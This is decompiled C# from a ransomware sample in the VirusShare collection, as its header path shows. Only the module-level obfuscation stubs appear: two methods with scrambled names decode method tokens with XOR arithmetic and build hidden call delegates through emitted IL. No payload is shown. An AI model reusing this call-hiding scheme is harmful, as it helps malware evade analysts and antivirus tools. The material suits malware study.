// Decompiled with JetBrains decompiler
// Type: <Module>
// Assembly: Julien, Version=8.9.6.4, Culture=neutral, PublicKeyToken=null
// MVID: DC93DDCB-0505-4D92-B171-2F5BFE543F19
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-2856282de5368454c64543081f3b8b884fe7a892343bcdf660c6522fdd1b74ee.exe

using System;
using System.Reflection;
using System.Reflection.Emit;

internal class \u003CModule\u003E
{
  internal static void ヒ葐㲮Ꙛ凳볏凌自(RuntimeFieldHandle f)
  {
    FieldInfo fieldFromHandle = FieldInfo.GetFieldFromHandle(f);
    byte[] numArray = fieldFromHandle.Module.ResolveSignature(fieldFromHandle.MetadataToken);
    uint num = (uint) ((int) numArray[numArray.Length - 6] | (int) numArray[numArray.Length - 5] << 8 | (int) numArray[numArray.Length - 3] << 16 | (int) numArray[numArray.Length - 2] << 24);
    ConstructorInfo con = fieldFromHandle.Module.ResolveMethod((int) num ^ 701846145 | (int) numArray[numArray.Length - 7] << 350544962 + (649817926 ^ 621758640) - 412683296) as ConstructorInfo;
    ParameterInfo[] parameters = con.GetParameters();
    Type[] parameterTypes = new Type[parameters.Length];
    for (int index = 0; index < parameters.Length; ++index)
      parameterTypes[index] = parameters[index].ParameterType;
    DynamicMethod dynamicMethod = con.DeclaringType.IsInterface || con.DeclaringType.IsArray ? new DynamicMethod("", con.DeclaringType, parameterTypes, fieldFromHandle.DeclaringType, true) : new DynamicMethod("", con.DeclaringType, parameterTypes, con.DeclaringType, true);
    ILGenerator ilGenerator = dynamicMethod.GetILGenerator();
    for (int index = 0; index < parameterTypes.Length; ++index)
      ilGenerator.Emit(OpCodes.Ldarg_S, index);
    ilGenerator.Emit(OpCodes.Newobj, con);
    ilGenerator.Emit(OpCodes.Ret);
    fieldFromHandle.SetValue((object) null, (object) dynamicMethod.CreateDelegate(fieldFromHandle.FieldType));
  }

  internal static void \u2684䌏싡鉊醤지廰켈(RuntimeFieldHandle f)
  {
    FieldInfo fieldFromHandle = FieldInfo.GetFieldFromHandle(f);
    byte[] numArray = fieldFromHandle.Module.ResolveSignature(fieldFromHandle.MetadataToken);
    uint num = (uint) ((int) numArray[numArray.Length - 6] | (int) numArray[numArray.Length - 5] << 8 | (int) numArray[numArray.Length - 3] << 16 | (int) numArray[numArray.Length - 2] << (1675163875 ^ -1534797759 - 1110221533) - (1518617339 - 1493398924));
    MethodInfo methodInfo = fieldFromHandle.Module.ResolveMethod((int) num ^ 1426530109 | (int) numArray[numArray.Length - 7] << 24) as MethodInfo;
    if (methodInfo.IsStatic)
    {
      fieldFromHandle.SetValue((object) null, (object) Delegate.CreateDelegate(fieldFromHandle.FieldType, methodInfo));
    }
    else
    {
      ParameterInfo[] parameters = methodInfo.GetParameters();
      Type[] parameterTypes = new Type[parameters.Length + 1];
      parameterTypes[0] = typeof (object);
      for (int index = 0; index < parameters.Length; ++index)
        parameterTypes[index + 1] = parameters[index].ParameterType;
      DynamicMethod dynamicMethod = methodInfo.DeclaringType.IsInterface || methodInfo.DeclaringType.IsArray ? new DynamicMethod("", methodInfo.ReturnType, parameterTypes, fieldFromHandle.DeclaringType, true) : new DynamicMethod("", methodInfo.ReturnType, parameterTypes, methodInfo.DeclaringType, true);
      ILGenerator ilGenerator = dynamicMethod.GetILGenerator();
      for (int index = 0; index < parameterTypes.Length; ++index)
      {
        ilGenerator.Emit(OpCodes.Ldarg, index);
        if (index == 0)
          ilGenerator.Emit(OpCodes.Castclass, methodInfo.DeclaringType);
      }
      ilGenerator.Emit(fieldFromHandle.Name[0] == '\u001C' ? OpCodes.Callvirt : OpCodes.Call, methodInfo);
      ilGenerator.Emit(OpCodes.Ret);
      fieldFromHandle.SetValue((object) null, (object) dynamicMethod.CreateDelegate(fieldFromHandle.FieldType));
    }
  }
}
